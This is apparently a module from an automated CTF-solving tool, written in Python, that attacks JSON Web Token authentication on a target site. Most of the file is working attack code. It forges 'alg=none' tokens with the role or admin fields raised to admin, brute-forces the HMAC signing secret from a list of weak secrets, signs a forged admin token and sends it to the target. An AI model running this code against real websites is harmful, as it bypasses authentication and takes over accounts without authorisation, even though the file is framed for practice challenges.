"""
JWT Module — Algorithm confusion, weak secrets, none-alg bypass
Very common in CTF web challenges (Flask session cookies too)
"""
import base64, json, hmac, hashlib
from backend.core.base_module import BaseModule
from backend.core.flag_hunter import FlagHunter


WEAK_SECRETS = [
    "secret", "password", "123456", "admin", "ctf",
    "supersecret", "jwt_secret", "flag", "key", "test",
    "iiitk", "csyclub", "taj", "hackme",
]


def b64_decode(s: str) -> bytes:
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def b64_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


class JWTModule(BaseModule):
    MODULE_NAME = "jwt"
    DESCRIPTION = "JWT — none-alg, weak secret, alg confusion"

    def run(self) -> dict:
        self.log(f"[JWT] Starting scan on {self.target_url}")

        # Step 1: Look for JWT in cookies/response
        resp = self.requester.get()
        if resp is None:
            self.results["status"] = "unreachable"
            return self.results

        token = self._find_token(resp)
        if not token:
            self.log("[JWT] No JWT found, trying login endpoints...")
            self.results["status"] = "no_token"
            return self.results

        self.log(f"[JWT] Token found: {token[:30]}...")
        self._test_none_alg(token)
        self._brute_secret(token)
        self._test_alg_confusion(token)

        flags = FlagHunter.hunt(resp.text)
        [self.add_flag(f) for f in flags]

        if self.results["status"] == "pending":
            self.results["status"] = "analyzed"
        return self.results

    def _find_token(self, resp) -> str:
        """Look for JWT in Set-Cookie header or response body."""
        import re
        token_re = r"eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+"
        # Check cookies
        for name, val in resp.cookies.items():
            m = re.search(token_re, val)
            if m:
                return m.group(0)
        # Check body
        m = re.search(token_re, resp.text)
        return m.group(0) if m else None

    def _decode_token(self, token: str):
        parts = token.split(".")
        if len(parts) != 3:
            return None, None
        try:
            header  = json.loads(b64_decode(parts[0]))
            payload = json.loads(b64_decode(parts[1]))
            return header, payload
        except Exception:
            return None, None

    def _test_none_alg(self, token: str):
        """Forge token with alg=none."""
        header, payload = self._decode_token(token)
        if not header or not payload:
            return
        # Elevate privilege
        for admin_key in ("admin", "role", "is_admin", "user", "username"):
            if admin_key in payload:
                payload[admin_key] = "admin" if admin_key in (
                    "role", "username", "user") else True

        new_header = {**header, "alg": "none"}
        forged = (b64_encode(json.dumps(new_header).encode()) + "." +
                  b64_encode(json.dumps(payload).encode()) + ".")

        r = self.requester.get(headers={"Authorization": f"Bearer {forged}",
                                        "Cookie": f"token={forged}"})
        if r:
            flags = FlagHunter.hunt(r.text)
            if flags:
                [self.add_flag(f) for f in flags]
            self.add_vuln({"type": "jwt_none_alg", "forged_token": forged})
            self.log("[JWT] none-alg bypass attempted")

    def _brute_secret(self, token: str):
        """HMAC-SHA256 secret brute-force."""
        parts = token.split(".")
        if len(parts) != 3:
            return
        signing_input = f"{parts[0]}.{parts[1]}".encode()
        sig = b64_decode(parts[2])
        for secret in WEAK_SECRETS:
            expected = hmac.new(secret.encode(), signing_input,
                                hashlib.sha256).digest()
            if expected == sig:
                self.add_vuln({"type": "jwt_weak_secret", "secret": secret})
                self.log(f"[JWT] Weak secret found: {secret}")
                # Forge admin token
                header, payload = self._decode_token(token)
                if payload:
                    for k in ("admin", "role", "is_admin"):
                        if k in payload:
                            payload[k] = True if k == "is_admin" else "admin"
                    new_head = b64_encode(json.dumps(
                        {"alg": "HS256", "typ": "JWT"}).encode())
                    new_pay  = b64_encode(json.dumps(payload).encode())
                    sig_new  = b64_encode(hmac.new(
                        secret.encode(),
                        f"{new_head}.{new_pay}".encode(),
                        hashlib.sha256).digest())
                    forged   = f"{new_head}.{new_pay}.{sig_new}"
                    r = self.requester.get(
                        headers={"Authorization": f"Bearer {forged}",
                                 "Cookie": f"token={forged}"})
                    if r:
                        flags = FlagHunter.hunt(r.text)
                        [self.add_flag(f) for f in flags]
                return

    def _test_alg_confusion(self, token: str):
        """RS256 -> HS256 confusion using public key as HMAC secret."""
        # Placeholder for real RS256->HS256 confusion attack
        self.log("[JWT] RS256->HS256 confusion: provide public key to exploit")
        self.add_vuln({"type": "jwt_alg_confusion_hint",
                       "note": "If RS256, try HS256 with public key as secret"})
